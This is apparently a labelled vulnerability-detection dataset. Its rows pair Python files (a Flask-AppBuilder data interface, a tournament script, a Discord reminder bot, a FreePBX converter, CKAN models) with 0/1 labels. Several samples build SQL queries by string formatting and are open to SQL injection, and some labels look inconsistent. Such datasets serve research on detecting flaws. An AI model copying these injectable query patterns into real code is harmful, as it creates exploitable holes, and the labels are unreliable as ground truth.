        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(order_column + ' ' + order_direction)
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/n/flask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data

def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by

def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages

def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes

def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))
    return orders

def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",1
128,128,2f26b43e26d656190a7dfa0f399e2dc7c0dd9a37,"tournament.py/n/n#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
    """"""Connect to the PostgreSQL database.  Returns a database connection.""""""
    return psycopg2.connect(""dbname=tournament"")


def deleteMatches():
    """"""Remove all the match records from the database.""""""
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM matches;"")
    db.commit()
    db.close


def deletePlayers():
    """"""Remove all the player records from the database.""""""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM players;"")
    db.commit()
    db.close


def countPlayers():
    """"""Returns the number of players currently registered.""""""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT COUNT(*) FROM players;"")
    rows = c.fetchall()
    db.commit()
    db.close
    return rows[0][0]


def registerPlayer(name):
    """"""Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """"""

    db = connect()
    c = db.cursor()
    # remove any occurance of quotes/apostrophes to prevent sql injection
    safe_n = name=name.translate(None, '\'\""')
    query = ""INSERT INTO players (name) values ('{name}')"".format(name=safe_n)
    c.execute(query)
    db.commit()
    db.close()


def playerStandings():
    """"""Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM standings"")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """"""Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """"""
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    c.execute(""INSERT INTO matches values (%s, %s)"" % (w, l))
    db.commit()
    db.close()


def swissPairings():
    """"""Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM pairup;"")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))
/n/n/n",0
129,129,2f26b43e26d656190a7dfa0f399e2dc7c0dd9a37,"/tournament.py/n/n#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2
import bleach


def connect():
    """"""Connect to the PostgreSQL database.  Returns a database connection.""""""
    return psycopg2.connect(""dbname=tournament"")


def deleteMatches():
    """"""Remove all the match records from the database.""""""
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM matches;"")
    db.commit()
    db.close


def deletePlayers():
    """"""Remove all the player records from the database.""""""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM players;"")
    db.commit()
    db.close


def countPlayers():
    """"""Returns the number of players currently registered.""""""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT COUNT(*) FROM players;"")
    rows = c.fetchall()
    db.commit()
    db.close
    return rows[0][0]


def registerPlayer(name):
    """"""Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """"""

    db = connect()
    c = db.cursor()
    c.execute(""INSERT INTO players (name) values (%s)"", (bleach.clean(name),))
    db.commit()
    db.close()


def playerStandings():
    """"""Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM standings"")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """"""Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """"""
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    c.execute(""INSERT INTO matches values (%s, %s)"" % (w, l))
    db.commit()
    db.close()


def swissPairings():
    """"""Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM pairup;"")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))
/n/n/n",1
144,144,10908191888bd37f31242bfd7d71c15c6f6fb10b,"cmds/remindme.py/n/nfrom datetime import datetime, timedelta
from time import localtime, strftime
import sqlite3


# Get the new date from string time/date
def get_date(time):
    now = datetime.now()
    if ',' in time:
        times = time.split(',')
        for t in times:
            val = t
            if 's' in val:
                val = val.replace('s', '')
                now += timedelta(seconds=int(val))
            elif 'm' in val:
                val = val.replace('m', '')
                now += timedelta(minutes=int(val))
            elif 'h' in val:
                val = val.replace('h', '')
                now += timedelta(hours=int(val))
            elif 'd' in val:
                val = val.replace('d', '')
                now += timedelta(days=int(val))
    else:
        val = time
        if 's' in val:
            val = val.replace('s', '')
            now += timedelta(seconds=int(val))
        elif 'm' in val:
            val = val.replace('m', '')
            now += timedelta(minutes=int(val))
        elif 'h' in val:
            val = val.replace('h', '')
            now += timedelta(hours=int(val))
        elif 'd' in val:
            val = val.replace('d', '')
            now += timedelta(days=int(val))
    return now


# RemindMe command
async def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('0', ?, ?, ?);"",
                               (author_id, msg, date.strftime('%Y-%m-%d %X')))
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))


# RemindAll command
async def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('1', ?, ?, ?);"",
                               (channel_id, msg, str(date)))
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))
/n/n/n",0
145,145,10908191888bd37f31242bfd7d71c15c6f6fb10b,"/cmds/remindme.py/n/nfrom datetime import datetime, timedelta
from time import localtime, strftime
import sqlite3


# Get the new date from string time/date
def get_date(time):
    now = datetime.now()
    if ',' in time:
        times = time.split(',')
        for t in times:
            val = t
            if 's' in val:
                val = val.replace('s', '')
                now += timedelta(seconds=int(val))
            elif 'm' in val:
                val = val.replace('m', '')
                now += timedelta(minutes=int(val))
            elif 'h' in val:
                val = val.replace('h', '')
                now += timedelta(hours=int(val))
            elif 'd' in val:
                val = val.replace('d', '')
                now += timedelta(days=int(val))
    else:
        val = time
        if 's' in val:
            val = val.replace('s', '')
            now += timedelta(seconds=int(val))
        elif 'm' in val:
            val = val.replace('m', '')
            now += timedelta(minutes=int(val))
        elif 'h' in val:
            val = val.replace('h', '')
            now += timedelta(hours=int(val))
        elif 'd' in val:
            val = val.replace('d', '')
            now += timedelta(days=int(val))
    return now


# RemindMe command
async def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('0', {}, '{}', '{}');""
                               .format(author_id, msg, date.strftime('%Y-%m-%d %X')))
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))
        print('')


# RemindAll command
async def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):
    a = a.split(' ')
    if len(a) >= 2:
        time = a[0].lower()
        msg = ''
        for i in range(1, len(a)):
            msg += a[i] + ' '
        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:
            date = get_date(time)
            try:
                con_ex.execute(""INSERT INTO reminder (type, channel, message, date) VALUES ('1', {}, '{}', '{}');""
                               .format(channel_id, msg, str(date)))
                con.commit()
                await dclient.send_message(channel, '{}, will remind you.'.format(mention))
            except sqlite3.Error as e:
                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '
                                                    'the admins!'.format(mention))
                print('[{}]: {} - {}'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                             'Error when trying to insert data: ' + e.args[0]))
                log_file.write('[{}]: {} - {}\n'.format(strftime(""%b %d, %Y %X"", localtime()), 'SQLITE',
                                                        'Error when trying to insert data: ' + e.args[0]))
        else:
            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'
                                       .format(mention, cmd_char))
    else:
        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))
        print('')
/n/n/n",1
96,96,ddd726faa6f19ef93022da0e047beb12d96cc3de,"freepbx_wav_to_mp3_converter.py/n/n#!/usr/bin/python3

import MySQLdb
import subprocess
import os.path
import sys

file_format = sys.argv[1]
record_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()

for wav_file in record_files.splitlines():
	name, ext = os.path.splitext(wav_file)
	prefer_format_file = ""{}."".format(name)+file_format
	subprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])
	os.remove(wav_file)

try:
    conn = MySQLdb.connect(host=""localhost"", db=""asteriskcdrdb"")
    cursor = conn.cursor()

except Exception as e:
    error = True

cursor.execute(""SELECT uniqueid,recordingfile FROM cdr"")
result = cursor.fetchall()
for unique_id, record_file in result:
    name, ext = os.path.splitext(record_file)
    if ext == "".wav"":
        print(ext)
        cursor.execute(""UPDATE cdr SET recordingfile=CONCAT(%s, '.', %s) WHERE uniqueid=%s"", (name, file_format, unique_id))
        conn.commit()

/n/n/n",0
97,97,ddd726faa6f19ef93022da0e047beb12d96cc3de,"/freepbx_wav_to_mp3_converter.py/n/n#!/usr/bin/python3

import MySQLdb
import subprocess
import os.path
import sys

file_format = sys.argv[1]
record_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()

for wav_file in record_files.splitlines():
	name, ext = os.path.splitext(wav_file)
	prefer_format_file = ""{}."".format(name)+file_format
	subprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])
	os.remove(wav_file)

try:
    conn = MySQLdb.connect(host=""localhost"", db=""asteriskcdrdb"")
    cursor = conn.cursor()

except Exception as e:
    error = True

cursor.execute(""SELECT uniqueid,recordingfile FROM cdr"")
result = cursor.fetchall()
for unique_id, record_file in result:
    name, ext = os.path.splitext(record_file)
    if ext == "".wav"":
        print(ext)
        cursor.execute(""UPDATE cdr SET recordingfile='{}."".format(name) + file_format + ""'"" + "" WHERE uniqueid='{}'"".format(unique_id))
        conn.commit()

/n/n/n",1
6,6,f020853c54a1851f196d7fd8897c4620bccf9f6c,"ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query = str(text_query) # SQLObject chokes on unicode.
        return self.select(self.q.name.contains(text_query.lower()))


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",0
7,7,f020853c54a1851f196d7fd8897c4620bccf9f6c,"/ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


